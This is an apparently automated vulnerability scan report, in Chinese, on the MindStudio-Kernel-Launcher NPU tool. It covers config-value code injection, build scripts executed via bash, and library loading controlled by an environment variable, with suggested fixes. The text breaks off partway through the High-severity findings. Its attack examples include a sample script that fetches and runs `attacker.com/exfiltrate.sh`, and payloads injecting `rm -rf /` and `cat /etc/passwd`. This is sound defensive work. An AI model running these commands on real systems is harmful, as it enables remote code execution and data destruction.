# 漏洞扫描报告 — 已确认漏洞

**项目**: MindStudio-Kernel-Launcher
**扫描时间**: 2026-04-21T02:33:00Z
**报告范围**: 仅包含 CONFIRMED 状态的漏洞

---

## 执行摘要

本次安全扫描针对 MindStudio-Kernel-Launcher 项目进行了深度漏洞分析，该项目是一个用于 NPU 内核开发和调优的 Python CLI 工具。扫描发现了 **18 个已确认漏洞**，其中 **5 个 Critical 级别**、**10 个 High 级别**、**3 个 Medium 级别**。

### 核心风险概述

项目存在三条完整的攻击链，构成了严重的安全风险：

1. **跨模块配置注入攻击链**（最严重）：用户通过 `@autotune` 装饰器提供的配置值未经内容安全验证，直接注入到内核源代码中，随后被编译为可执行模块并在 NPU 设备上执行。攻击者可通过配置值注入任意 C++ 代码，获得与工具相同的权限。

2. **环境变量动态库加载攻击链**：`ASCEND_HOME_PATH` 环境变量控制动态库加载路径，且在模块导入时自动执行。攻击者控制该环境变量可加载恶意 `libmspti.so` 或 `libruntime.so`，实现无需用户交互的任意代码执行。

3. **用户脚本执行攻击链**：`compile()` 和 `compile_executable()` 函数直接执行用户提供的 bash 构建脚本，FileChecker 仅验证文件权限而不验证脚本内容，导致任意命令执行。

### 业务影响

这些漏洞可能导致：
- **数据泄露**：恶意代码可访问 NPU 设备上的敏感数据
- **系统沦陷**：攻击者可获得与工具进程相同的权限
- **供应链攻击**：恶意配置可被传播到其他用户
- **生产环境破坏**：编译后的恶意模块可在生产环境中执行

### 修复优先级建议

建议立即处理所有 Critical 级别漏洞，重点修复配置值内容验证和环境变量路径白名单机制。High 级别漏洞应在短期内修复，特别是跨模块凭证传递相关的安全问题。

---

## 1. 扫描摘要

### 1.1 验证状态分布

| 状态 | 数量 | 占比 |
|------|------|------|
| CONFIRMED | 18 | 56.3% |
| POSSIBLE | 7 | 21.9% |
| FALSE_POSITIVE | 5 | 15.6% |
| LIKELY | 2 | 6.3% |
| **总计** | **32** | 100% |

### 1.2 严重性分布

| 严重性 | 数量 | 占比 |
|--------|------|------|
| Critical | 5 | 27.8% |
| High | 10 | 55.6% |
| Medium | 3 | 16.7% |
| **有效漏洞总计** | **18** | - |
| 误报 (FALSE_POSITIVE) | 5 | - |

### 1.3 Top 10 关键漏洞

1. **[cross-module-configs-to-command-exec]** Cross-Module Attack Chain (Critical) - `mskl/optune/tuner.py:251` @ `autotune` | 置信度: 95
2. **[VULN-SEC-OPT-001]** code_injection (Critical) - `mskl/optune/kernel_modifier.py:76` @ `_replace_param` | 置信度: 95
3. **[9b345463d9b3]** command_injection (Critical) - `mskl/launcher/compiler.py:206` @ `compile` | 置信度: 90
4. **[6c40d5f31c11]** command_injection (Critical) - `mskl/launcher/compiler.py:370` @ `compile_executable` | 置信度: 90
5. **[VULN-SEC-LAU-001]** command_injection (Critical) - `mskl/launcher/compiler.py:205` @ `compile` | 置信度: 75
6. **[VULN-SEC-XMOD-001]** privilege_escalation (High) - `mskl/optune/tuner.py:251` @ `autotune` | 置信度: 100
7. **[VULN-SEC-XMOD-002]** environment_variable_manipulation (High) - `mskl/utils/launcher_utils.py:23` @ `get_cann_path` | 置信度: 100
8. **[VULN-UTILS-002]** EnvVarToDynamicLib (High) - `mskl/launcher/driver.py:30` @ `load_mspti_so` | 置信度: 95
9. **[optune-autotune-config-injection-001]** Code Injection (High) - `mskl/optune/tuner.py:251` @ `autotune` | 置信度: 95
10. **[optune-autotune_v2-config-injection-002]** Code Injection (High) - `mskl/optune/tuner.py:557` @ `autotune_v2` | 置信度: 95

---

## 2. 攻击面分析

| 入口点 | 类型 | 信任等级 | 可达性理由 | 说明 |
|--------|------|----------|-----------|------|
| `compile@mskl/launcher/compiler.py` | cmdline | untrusted_local | User calls mskl.compile(build_script, launch_src_file) from their script. build_script path is user-controlled and executed as bash script via subprocess.run | API entry point that executes arbitrary bash scripts for compilation |
| `compile_executable@mskl/launcher/compiler.py` | cmdline | untrusted_local | User calls mskl.compile_executable(build_script, src_file) from their script. build_script path is user-controlled and executed as bash script | API entry point for compiling executables via user-provided build scripts |
| `tiling_func@mskl/launcher/opgen_workflow.py` | cmdline | untrusted_local | User calls mskl.tiling_func() with op_type, inputs, outputs, lib_path, etc. Parameters influence generated code and compiled modules | API entry point for tiling function invocation |
| `get_kernel_from_binary@mskl/launcher/opgen_workflow.py` | cmdline | untrusted_local | User calls mskl.get_kernel_from_binary(kernel_binary_file) with path to kernel binary. Path is validated but user-controlled | API entry point for loading kernel from binary file |
| `Launcher@mskl/launcher/code_generator.py` | cmdline | untrusted_local | User creates Launcher(config) which generates C++ glue code. Config contains user-provided kernel_src_file and kernel_name | Code generation entry point |
| `autotune@mskl/optune/tuner.py` | decorator | untrusted_local | Decorator @autotune(configs) receives user-provided config list. Configs are used to modify kernel source files | Auto-tuning decorator entry point |
| `autotune_v2@mskl/optune/tuner.py` | decorator | untrusted_local | Decorator @autotune_v2(configs) receives user-provided config list and executes msprof profiling | Auto-tuning v2 decorator entry point |
| `main@build.py` | cmdline | untrusted_local | CLI tool invoked by user with command line arguments. Executes subprocess commands for build/test | Build script CLI entry point |
| `is_lib_preloaded@mskl/launcher/driver.py` | env | semi_trusted | Reads LD_PRELOAD environment variable to check for preloaded libraries. Environment variables are typically controlled by deployment/admin | Environment variable read for security check |
| `load_mspti_so@mskl/launcher/driver.py` | env | semi_trusted | Reads ASCEND_HOME_PATH environment variable to load libmspti.so. Path is deployment-controlled | Environment variable read for library loading |
| `get_cann_path@mskl/utils/launcher_utils.py` | env | semi_trusted | Reads ASCEND_HOME_PATH environment variable. Required for CANN installation path | Environment variable read for CANN path |
| `module_init@mskl/utils/logger.py` | env | semi_trusted | Reads MSKL_LOG_LEVEL environment variable for log configuration | Environment variable read for logging configuration |

**其他攻击面**:
- Bash script execution via mskl.compile() and mskl.compile_executable() - build_script parameter
- Dynamic library loading via importlib.util - compiled .so modules
- Code generation - C++ glue code with embedded kernel names and paths
- File path parameters - kernel_src_file, kernel_binary_file, lib_path
- Configuration parameters - op_type, inputs, outputs, attrs
- Environment variables - ASCEND_HOME_PATH, LD_PRELOAD, MSKL_LOG_LEVEL
- Auto-tune config modification - kernel source file rewriting

---

## 3. Critical 漏洞 (5)

### [cross-module-configs-to-command-exec] Cross-Module Attack Chain - autotune

**严重性**: Critical | **CWE**: CWE-94,CWE-78 | **置信度**: 95/100 | **状态**: CONFIRMED | **来源**: dataflow-scanner

**位置**: `mskl/optune/tuner.py:251-279` @ `autotune`
**模块**: optune
**跨模块**: optune → launcher → utils

**描述**: Complete cross-module attack chain: User configs from @autotune decorator → source code injection via kernel_modifier._replace_param() → compilation via launcher.compile() → arbitrary command execution via subprocess.run(['bash', build_script]). This chain spans 3 modules (optune→launcher→utils) and allows arbitrary C++ code injection followed by arbitrary shell command execution.

**漏洞代码** (`mskl/optune/tuner.py:251-279`)

```python
# tuner.py:251-279 - autotune 装饰器定义
def autotune(configs: List[Dict], warmup: int = 300, repeat: int = 1, device_ids=None):
    """Decorator for auto-tuning a kernel. Evaluate the configs and present the best one."""
    if device_ids is None:
        device_ids = [0]
    def decorator(func):
        def wrapper(*args, **kwargs):
            try:
                logger.debug('Starting kernel autotune... ')
                autotune_utils.check_autotune_params(configs, warmup, repeat, device_ids)
                Autotuner().pre_launch(func, device_ids[0], *args, **kwargs)
                executor = Executor(configs, device_ids, warmup, repeat)
                executor.execute()  # 关键：执行用户配置
```

**达成路径**

[IN] configs@optune/tuner.py:251 → [OUT] Replacer.replace_config()@optune/kernel_modifier.py:93 → [OUT] _replace_param(key,val)@kernel_modifier.py:63 → [OUT] _write_to_file()@kernel_modifier.py:58 → [IN] compile(build_script)@launcher/compiler.py:171 → [OUT] subprocess.run(['bash',build_script])@compiler.py:206 → [IN] NPULauncher.__call__()@driver.py:78 → [OUT] importlib.exec_module()@driver.py:105

**深度分析**

**根因分析**：该攻击链的根本原因在于用户配置值在整个处理流程中缺乏内容安全验证。

1. **入口点（tuner.py:251-272）**：`autotune` 装饰器接收用户提供的 `configs` 参数（类型为 `List[Dict]`），直接传递给 `Executor` 类进行并行处理。`autotune_utils.check_autotune_params()` 仅验证参数类型和结构，不验证配置值的实际内容。

2. **注入点（kernel_modifier.py:63-91）**：`_replace_param()` 方法将配置值直接替换到内核源代码行中：
   ```python
   # kernel_modifier.py:76,88 - 关键注入点
   lines[index] = Replacer._replace_content_for_alias_name(index, line, val)  # Line 76
   lines[index] = Replacer._replace_content_for_tunable_name(index, line, val)  # Line 88
   ```
   配置值 `val` 直接作为字符串写入，无任何 C++ 特殊字符过滤（如 `#include`、`//`、`"`、`\n` 等）。

3. **执行点（compiler.py:205-206）**：编译后的源代码通过 `subprocess.run(['bash', build_script, ...])` 执行，用户可通过配置值注入恶意 C++ 代码，在编译和运行时执行。

**潜在利用场景**：
```python
# 攻击示例：通过配置值注入恶意 C++ 代码
@autotune(configs=[
    {"block_size": "256; system(\"rm -rf /data/*\"); //"},
    {"tiling_factor": "#include \"/tmp/malicious.h\""}
])
def kernel_func(...):
    ...
```

该配置将导致内核源代码被篡改，注入的恶意代码将在编译后执行，获得与 Python 进程相同的权限。

**建议的修复方式**：
1. 在 `check_autotune_params()` 中添加配置值内容验证，禁止 C++ 特殊字符（`#`、`//`、`"`、`\n`、`;` 等）
2. 使用正则表达式验证配置值仅包含合法的数字、标识符格式
3. 在 `_replace_param()` 中添加输出编码，确保配置值在 C++ 上下文中安全
4. 考虑使用 AST 解析而非字符串替换进行源码修改

---

### [VULN-SEC-OPT-001] code_injection - _replace_param

**严重性**: Critical | **CWE**: CWE-94 | **置信度**: 95/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `mskl/optune/kernel_modifier.py:76-88` @ `_replace_param`
**模块**: optune
**跨模块**: optune → launcher

**描述**: 用户配置值直接写入内核源文件。Replacer.replace_config() 和 Replacer.replace_src_with_config() 将用户提供的配置值直接替换源文件内容。配置值只做类型验证（int/bool/float/str），不做内容安全验证。如果配置值包含 C++ 特殊字符（如 '#include', '//', '"', '\n'），可能导致源码被篡改，在编译后执行恶意代码。

**漏洞代码** (`mskl/optune/kernel_modifier.py:63-91`)

```python
# kernel_modifier.py:63-91 - _replace_param 方法
@staticmethod
def _replace_param(key, val, lines):
    if not lines:
        raise OSError('The kernel src file is empty.')
    replace_param_success = False
    alias_key = f'tunable:{key}'
    for index, line in enumerate(lines):
        if not line:
            continue
        line_without_space = line.strip().replace(' ', '')
        if line_without_space.startswith('//'):
            continue
        # mode 1, match alias name - 关键注入点
        if line_without_space.endswith('//' + alias_key):
            lines[index] = Replacer._replace_content_for_alias_name(index, line, val)  # Line 76
            replace_param_success = True
            break
        # mode 2, match tunable name - 关键注入点
        if line_without_space.endswith('//' + 'tunable') and key in line:
            ...
            lines[index] = Replacer._replace_content_for_tunable_name(index, line, val)  # Line 88
            replace_param_success = True
            break
    return replace_param_success

# kernel_modifier.py:38-50 - 替换方法直接拼接用户值
@staticmethod
def _replace_content_for_alias_name(line_index, line, replacement):
    index = len(line) - len(line.lstrip())
    new_line = line[:index] + replacement  # 直接拼接，无任何验证
    if line.endswith('\n'):
        new_line += '\n'
    return new_line
```

**达成路径**

autotune(configs) → Replacer.replace_config() → _replace_param(key, val, lines) → Modified Kernel Source → Compile → Execution

**深度分析**

**根因分析**：该漏洞是跨模块攻击链的核心注入点。`_replace_param()` 方法使用字符串直接拼接方式修改源代码，完全信任用户提供的配置值。

**实际代码行为**（kernel_modifier.py:38-50）：
- `_replace_content_for_alias_name()`：直接将 `replacement` 字符串拼接到行首，保留原有缩进
- `_replace_content_for_tunable_name()`：替换等号后的值部分，同样无内容验证

**攻击向量分析**：
| 配置值 | 注入效果 |
|--------|----------|
| `"256; system(\"cat /etc/passwd\"); //"` | 注入系统调用 |
| `"#include \"/tmp/evil.h\""` | 引入恶意头文件 |
| `"1\n#include \"malicious.cpp\""` | 跨行注入代码 |
| `"/* comment */ value"` | 注入注释隐藏恶意代码 |

**验证说明**: Complete attack chain verified: User configs → check_configs() only validates types (not content) → Replacer.replace_config()/_replace_param() directly injects values into kernel source code at lines 76,88 → _write_to_file() writes modified source → compile() runs subprocess.run(["bash", build_script, ...]) at compiler.py:206 → compiled binary executes on NPU. No content sanitization found in check_configs() (autotune_utils.py:39-49) or kernel_modifier.py. Attack vector: configs=[{"param": "256; system(\"rm -rf /\"); //"}]

**建议的修复方式**：
1. **添加内容白名单验证**：限制配置值仅包含合法字符（数字、字母、下划线）
   ```python
   # 建议的安全验证
   import re
   if not re.match(r'^[A-Za-z0-9_\-\.]+$', str(val)):
       raise ValueError(f"Invalid config value: {val}")
   ```
2. **添加长度限制**：防止超长值导致缓冲区问题
3. **禁止特殊字符**：显式禁止 `#`, `//`, `\n`, `;`, `"`, `'` 等字符
4. **使用参数化模板**：而非直接字符串替换

---

### [9b345463d9b3] command_injection - compile

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 90/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/launcher/compiler.py:205-206` @ `compile`
**模块**: launcher

**描述**: User-provided build_script executed via subprocess.run(['bash', build_script, ...]). FileChecker validates file metadata but cannot prevent malicious script content.

**漏洞代码** (`mskl/launcher/compiler.py:171-213`)

```python
# compiler.py:171-213 - compile 函数
def compile(build_script: str,
            launch_src_file: str,
            output_bin_path: str = "_gen_module.so",
            use_cache: bool = False) -> CompiledKernel:
    """Compile a kernel and return a launchable kernel object."""
    _check_compie_input(build_script, launch_src_file, output_bin_path, use_cache)
    abs_launch_src_path = os.path.realpath(launch_src_file)
    abs_output_bin_path = os.path.realpath(output_bin_path)

    # ... 缓存处理 ...

    context.build_script = build_script
    context.launch_src_file = abs_launch_src_path

    # 关键漏洞点：直接执行用户提供的 bash 脚本
    compile_cmd = ["bash", build_script, abs_launch_src_path, abs_output_bin_path]  # Line 205
    result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=600)  # Line 206
    if result.returncode != 0:
        raise Exception("Compile failed.\nCommand info: " + ' '.join(compile_cmd) + "\n{}".format(result.stderr))

    return CompiledKernel(abs_output_bin_path, context.kernel_name)
```

**达成路径**

build_script(user)[IN] -> compile() -> FileChecker -> subprocess.run(['bash', build_script])[SINK]

**深度分析**

**根因分析**：`compile()` 函数的设计假设用户提供的构建脚本是可信的，但这一假设在多用户环境或处理外部输入时会导致任意命令执行。

**FileChecker 验证范围**（仅验证元数据，不验证内容）：
- 检查文件是否存在
- 检查文件权限
- 检查文件大小
- 检查是否为软链接（但仅警告，不阻止）
- 检查文件所有权（但仅警告，不阻止）

**攻击场景**：
```bash
# 恶意 build_script 内容示例
#!/bin/bash
# 正常编译命令
g++ "$1" -o "$2" ...

# 隐藏的恶意命令
curl http://attacker.com/exfiltrate.sh | bash
chmod 777 /tmp && echo "malicious" > /tmp/payload
```

调用 `mskl.compile("./malicious_build.sh", "kernel.cpp")` 将执行上述所有命令。

**潜在利用场景**：
1. **数据窃取**：脚本可访问用户可访问的所有文件
2. **持久化**：脚本可修改系统配置或植入后门
3. **横向移动**：在有网络访问的环境中，可下载并执行远程恶意代码
4. **环境污染**：修改环境变量、PATH 等，影响后续操作

**建议的修复方式**：
1. **构建脚本白名单**：只允许预定义的安全构建脚本路径
2. **内容验证**：对构建脚本内容进行静态分析，检测危险命令
3. **沙箱执行**：使用 `subprocess.run()` 的限制参数：
   ```python
   # 安全执行建议
   result = subprocess.run(
       compile_cmd,
       capture_output=True,
       text=True,
       timeout=600,
       env={"PATH": "/usr/bin"},  # 限制 PATH
       cwd="/safe/workdir"  # 限制工作目录
   )
   ```
4. **权限分离**：以受限用户身份执行构建脚本
5. **审计日志**：记录所有构建脚本执行内容

---

### [6c40d5f31c11] command_injection - compile_executable

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 90/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/launcher/compiler.py:319-377` @ `compile_executable`
**模块**: launcher

**描述**: compile_executable() executes user-provided build_script via subprocess.run(['bash', build_script, ...]). Same vulnerability as compile().

**漏洞代码** (`mskl/launcher/compiler.py:319-377`)

```python
# compiler.py:319-377 - compile_executable 函数
def compile_executable(build_script: str,
                       src_file: str,
                       output_bin_path: str = "_gen_executable",
                       use_cache: bool = False) -> CompiledExecutable:
    """Compile and return an executable object."""
    # ... 验证处理 ...
    
    if context.prelaunch_flag:
        context.build_script = build_script
        context.kernel_src_file = abs_src_path
        return CompiledExecutable(abs_output_bin_path)

    # 关键漏洞点：直接执行用户提供的 bash 脚本
    compile_cmd = ["bash", build_script, abs_src_path, abs_output_bin_path]  # Line 369
    result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=120)  # Line 370
    if result.returncode != 0:
        raise Exception("Compile failed.\nCommand info: " + ' '.join(compile_cmd) + "\n{}".format(result.stderr))

    return CompiledExecutable(abs_output_bin_path)
```

**达成路径**

build_script(user)[IN] -> compile_executable() -> FileChecker -> subprocess.run[SINK]

**深度分析**

**根因分析**：`compile_executable()` 与 `compile()` 存在相同的设计缺陷，直接信任并执行用户提供的构建脚本。该函数被 `autotune_v2` 装饰器使用，扩大了攻击面。

**调用链分析**：
```
autotune_v2(configs) → AutotuneV2Scheduler → _compile_task(index) → 
AutotuneV2.compile(new_src_file) → compile_executable(build_script, ...) → 
subprocess.run(['bash', build_script])
```

**与 compile() 的区别**：
- `compile_executable()` 编译的是可执行文件而非共享库
- 被 `autotune_v2` 装饰器自动调用，用户可能不知道脚本被执行
- 超时时间为 120 秒（vs compile() 的 600 秒）

**攻击影响**：通过 `@autotune_v2` 装饰器，攻击者可以：
1. 在调优过程中执行恶意脚本
2. 利用并发编译特性，多次执行恶意命令
3. 通过配置注入配合脚本执行，形成完整攻击链

**建议的修复方式**：与 `compile()` 漏洞相同，需要：
1. 构建脚本路径白名单
2. 脚本内容静态分析
3. 沙箱执行环境
4. 安全警告和用户确认机制

---

### [VULN-SEC-LAU-001] command_injection - compile

**严重性**: Critical | **CWE**: CWE-78 | **置信度**: 75/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `mskl/launcher/compiler.py:205-206` @ `compile`
**模块**: launcher

**描述**: 用户提供的 build_script 直接作为 bash 脚本执行。compile() 函数在第 205 行调用 subprocess.run(['bash', build_script, ...])，compile_executable() 函数在第 369 行同样执行用户提供的 bash 脚本。虽然 FileChecker 验证文件权限和大小，但不验证脚本内容，用户可通过恶意脚本实现任意命令执行。这是设计层面的信任风险，但缺少沙箱隔离或安全警告。

**漏洞代码** (`mskl/launcher/compiler.py:205-206`)

```python
compile_cmd = ['bash', build_script, abs_launch_src_path, abs_output_bin_path]
result = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=600)
```

**达成路径**

User Script → compile(build_script) → subprocess.run(['bash', build_script]) → Arbitrary Command Execution

**深度分析**

**根因分析**：这是设计层面的信任边界问题。工具假设构建脚本来自可信来源（项目开发者），但在以下场景中该假设失效：
1. 处理第三方提供的脚本
2. 多用户共享环境
3. 自动化 CI/CD 流程中处理外部输入
4. 配合配置注入漏洞使用

**现有安全措施分析**：
| 安全检查 | 实际效果 | 缺陷 |
|----------|----------|------|
| FileChecker.check_input_file() | 检查文件存在、权限、大小 | 不检查内容 |
| FileChecker.is_soft_link_recusively() | 检测软链接 | 仅警告，不阻止 |
| FileChecker.check_path_permission() | 检查所有权 | 仅警告，不阻止 |
| timeout=600 | 限制执行时间 | 不限制命令内容 |

**完整攻击链组合**：
```
配置注入漏洞 → 源码篡改 → 编译 → 
恶意脚本执行 (本漏洞) → 动态库加载 → 任意代码执行
```

**验证说明**: CONFIRMED: User-provided build_script is directly executed via subprocess.run(["bash", build_script, ...]). FileChecker validates path/permissions but NOT script content. This is a design-level trust issue - the tool explicitly executes user scripts without sandbox or content validation. Full command execution capability.

**评分明细**: base: 30 | reachability: 15 | controllability: 20 | mitigations: -5 | context: 5 | cross_file: 10

**建议的修复方式**：
1. **安全警告**：在执行脚本前向用户显示警告
2. **脚本签名验证**：要求可信脚本具有签名
3. **沙箱机制**：使用 Docker 容器或受限环境执行
4. **命令白名单**：限制脚本可使用的命令类型
5. **输入分离**：区分可信内部脚本和外部输入脚本

---

## 4. High 漏洞 (10)

### [VULN-SEC-XMOD-001] privilege_escalation - autotune

**严重性**: High | **CWE**: CWE-269 | **置信度**: 100/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `mskl/optune/tuner.py:251-280` @ `autotune`
**模块**: cross_module
**跨模块**: optune → launcher → utils

**描述**: [CREDENTIAL_FLOW] 跨模块凭证传递分析：用户通过 autotune 装饰器提供配置 → optune.kernel_modifier 替换源码 → launcher.compiler 编译 → launcher.driver 动态加载执行。整个流程中，用户配置值未经充分安全验证即被嵌入源码、编译为可执行代码并动态加载。恶意用户可通过配置值注入 C++ 代码，在编译后的 .so 模块执行时获得与 mskl 库相同的权限。这是一个完整的攻击链，从配置注入到代码执行。

**漏洞代码** (`mskl/optune/tuner.py:251-280`)

```python
def autotune(configs: List[Dict], warmup: int = 300, repeat: int = 1, device_ids=None):
    def decorator(func):
        def wrapper(*args, **kwargs):
            autotune_utils.check_autotune_params(configs, warmup, repeat, device_ids)
            Autotuner().pre_launch(func, device_ids[0], *args, **kwargs)
            executor = Executor(configs, device_ids, warmup, repeat)
            executor.execute()
```

**达成路径**

[跨模块流程]
1. User provides configs → autotune decorator
2. optune.kernel_modifier: configs → _replace_param() → Modified source file
3. launcher.code_generator: Modified source → code_gen() → Generated C++ glue code
4. launcher.compiler: compile() → subprocess.run(['bash', build_script]) → Compiled .so
5. launcher.driver: NPULauncher.__call__() → importlib → Dynamic code execution

[安全缺口]
- Step 2: 配置值仅验证类型，未验证 C++ 特殊字符
- Step 4: build_script 内容未验证
- Step 5: .so 模块代码直接执行

**验证说明**: [CROSS_MODULE_VERIFIED] Complete call chain verified. Attack path: autotune -> Replacer.replace_config -> compile -> subprocess.run -> NPULauncher(importlib). Safety checks exist (FileChecker) but do not sanitize config values.

---

### [VULN-SEC-XMOD-002] environment_variable_manipulation - get_cann_path

**严重性**: High | **CWE**: CWE-454 | **置信度**: 100/100 | **状态**: CONFIRMED | **来源**: security-auditor

**位置**: `mskl/utils/launcher_utils.py:23-27` @ `get_cann_path`
**模块**: cross_module
**跨模块**: utils → launcher

**描述**: [CREDENTIAL_FLOW] 环境变量跨模块使用分析：ASCEND_HOME_PATH 环境变量被多个模块读取并用于动态库加载。driver.py:31 (load_mspti_so) 和 launcher_utils.py:24 (get_cann_path) 都读取此环境变量。如果环境变量被恶意设置，将影响 launcher.compiler 的编译参数（g++ -I{cann_path}/include -L{cann_path}/lib64）和 launcher.driver 的动态库加载。这是一个信任边界问题——部署环境被视为可信，但缺少额外验证。

**漏洞代码** (`mskl/utils/launcher_utils.py:23-27`)

```python
def get_cann_path() -> str:
    cann_path = os.getenv('ASCEND_HOME_PATH')
    if cann_path is None or not os.path.isdir(cann_path):
        raise Exception('ASCEND_HOME_PATH is invalid, please check your environment variables')
    return cann_path
```

**达成路径**

[跨模块依赖]
1. utils.launcher_utils: get_cann_path() → os.getenv('ASCEND_HOME_PATH') → cann_path
2. launcher.driver: load_mspti_so() → ctypes.CDLL(os.path.join(cann_path, 'lib64/libmspti.so'))
3. launcher.compiler: compile_tiling() → subprocess.run(['g++', ..., f'-I{cann_path}/include', f'-L{cann_path}/lib64'])

[安全缺口]
- 环境变量仅检查是否为目录，未验证路径是否为合法的 CANN 安装路径
- 未检查路径所有权或签名

**验证说明**: [CROSS_MODULE_VERIFIED] Complete cross-module env var usage verified. ASCEND_HOME_PATH used in: launcher_utils.py:24 (get_cann_path), driver.py:31 (load_mspti_so), compiler.py:224,251 (compile flags). Path existence checks exist but no sanitization.

---

### [VULN-UTILS-002] EnvVarToDynamicLib - load_mspti_so

**严重性**: High | **CWE**: CWE-426 | **置信度**: 95/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/launcher/driver.py:30-39` @ `load_mspti_so`
**模块**: utils
**跨模块**: utils,launcher

**描述**: Environment variable ASCEND_HOME_PATH flows to ctypes.CDLL in load_mspti_so without FileChecker validation. Called at module import time - automatic execution

**漏洞代码** (`mskl/launcher/driver.py:30-39`)

```python
def load_mspti_so():
    cann_path = os.getenv("ASCEND_HOME_PATH")
    if cann_path:
        mspti_path = os.path.join(cann_path, "lib64/libmspti.so")
        mspti_real_path = os.path.realpath(mspti_path)
        if mspti_real_path and os.path.exists(mspti_real_path):
            lib = ctypes.CDLL(mspti_real_path, mode=ctypes.RTLD_GLOBAL)

# Line 39: 模块导入时自动执行
load_mspti_so()
```

**达成路径**

ASCEND_HOME_PATH(os.getenv) -> os.path.join -> os.path.realpath -> ctypes.CDLL

**验证说明**: 真实漏洞：load_mspti_so()在driver.py模块导入时自动执行(line 39:load_mspti_so())。ASCEND_HOME_PATH环境变量控制libmspti.so加载路径，攻击者可加载恶意库实现任意代码执行。这是最危险的漏洞，因为无需用户交互即可触发。

---

### [optune-autotune-config-injection-001] Code Injection - autotune

**严重性**: High | **CWE**: CWE-94 | **置信度**: 95/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/optune/tuner.py:251-279` @ `autotune`
**模块**: optune
**跨模块**: optune,launcher,utils

**描述**: User-provided config values in autotune decorator are directly injected into kernel source code without content validation. The check_configs() function only validates types (str, dict, list) but does not sanitize the actual content. Malicious values can inject arbitrary C++ code that gets compiled and executed on the NPU device.

**漏洞代码** (`mskl/optune/tuner.py:251-279`)

```python
def autotune(configs: List[Dict], warmup: int = 300, repeat: int = 1, device_ids=None):
    ...
    executor = Executor(configs, device_ids, warmup, repeat)
    executor.execute()
```

**达成路径**

[IN] configs@tuner.py:251 → Executor(configs)@tuner.py:272 → _compile_task(index)@tuner.py:186 → config=self._configs[index]@tuner.py:190 → gen_context(index,config)@tuner.py:192 → [OUT] Replacer.replace_config(config,...)@kernel_modifier.py:93 → _replace_param(key,value,lines)@kernel_modifier.py:63 → lines[index]=val@kernel_modifier.py:76,88 → [OUT] _write_to_file(lines,path)@kernel_modifier.py:58 → kernel source modification

**验证说明**: Code injection via autotune decorator confirmed. Data flow: configs@tuner.py:251 → Executor.__init__()@tuner.py:131 → _compile_task()@tuner.py:186 → gen_context(index, config)@tuner.py:112 → Replacer.replace_config()@kernel_modifier.py:93 → _replace_param()@kernel_modifier.py:63 → lines[index]=val@kernel_modifier.py:76,88 → compile()@compiler.py:171 → subprocess.run(["bash", build_script, ...])@compiler.py:206. check_configs() only validates types, not content.

---

### [optune-autotune_v2-config-injection-002] Code Injection - autotune_v2

**严重性**: High | **CWE**: CWE-94 | **置信度**: 95/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/optune/tuner.py:557-578` @ `autotune_v2`
**模块**: optune
**跨模块**: optune,launcher,utils

**描述**: User-provided config values in autotune_v2 decorator are directly injected into kernel source code without content validation. The check_configs() function only validates types but does not sanitize content. Malicious values like "; system(\"rm -rf /\"); //" can inject arbitrary C++ code.

**漏洞代码** (`mskl/optune/tuner.py:557-578`)

```python
def autotune_v2(configs: list, warmup_times: int = 5):
    ...
    scheduler = AutotuneV2Scheduler(configs, warmup_times, launch_params)
```

**达成路径**

[IN] configs@tuner.py:557 → AutotunerV2Scheduler.__init__(configs)@tuner.py:283 → _compile_task(i)@tuner.py:332 → gen_src_file(index)@tuner.py:420 → [OUT] Replacer.replace_src_with_config(src_file,new_src_file,self.configs[index])@kernel_modifier.py:30 → _replace_param(key,value,lines)@kernel_modifier.py:33 → lines[index]=val@kernel_modifier.py:76,88 → [OUT] _write_to_file(lines,path)@kernel_modifier.py:35 → kernel source modification

**验证说明**: Code injection via autotune_v2 decorator confirmed. Data flow: configs@tuner.py:557 → AutotuneV2Scheduler.__init__()@tuner.py:283 → _compile_task()@tuner.py:332 → gen_src_file()@tuner.py:420 → Replacer.replace_src_with_config()@kernel_modifier.py:30 → _replace_param()@kernel_modifier.py:63 → lines[index]=val@kernel_modifier.py:76,88 → compile_executable()@compiler.py:319 → subprocess.run()@compiler.py:370. check_configs() only validates types (str), not content.

---

### [VULN-UTILS-001] EnvVarToDynamicLib - get_cann_path/check_runtime_impl

**严重性**: High | **CWE**: CWE-426 | **置信度**: 90/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/utils/launcher_utils.py:23-38` @ `get_cann_path/check_runtime_impl`
**模块**: utils
**跨模块**: utils,launcher

**描述**: Environment variable ASCEND_HOME_PATH flows to ctypes.CDLL without proper path validation. Attacker controlling ASCEND_HOME_PATH can force loading of malicious libruntime.so

**漏洞代码** (`mskl/utils/launcher_utils.py:23-38`)

```python
def get_cann_path() -> str:
    cann_path = os.getenv("ASCEND_HOME_PATH")
    if cann_path is None or not os.path.isdir(cann_path):
        raise Exception('ASCEND_HOME_PATH is invalid')
    return cann_path

def check_runtime_impl():
    cann_path = get_cann_path()
    if os.path.exists(os.path.join(cann_path, "lib64/libruntime.so")):
        import ctypes
        runtime_lib = ctypes.CDLL(os.path.join(cann_path, "lib64/libruntime.so"), mode=ctypes.RTLD_GLOBAL)
```

**达成路径**

ASCEND_HOME_PATH(os.getenv) -> get_cann_path() -> os.path.join -> ctypes.CDLL

**验证说明**: 真实漏洞：get_cann_path()读取ASCEND_HOME_PATH环境变量，check_runtime_impl()直接使用ctypes.CDLL加载libruntime.so。从调用图可见，check_runtime_impl()被KernelBinaryLauncher.code_gen调用，是生产路径。

---

### [optune-kernel_modifier-replace_param-003] Code Injection - _replace_param

**严重性**: High | **CWE**: CWE-94 | **置信度**: 90/100 | **状态**: CONFIRMED | **来源**: unknown

**位置**: `mskl/optune/kernel_modifier.py:63-91` @ `_replace_param`
**模块**: optune

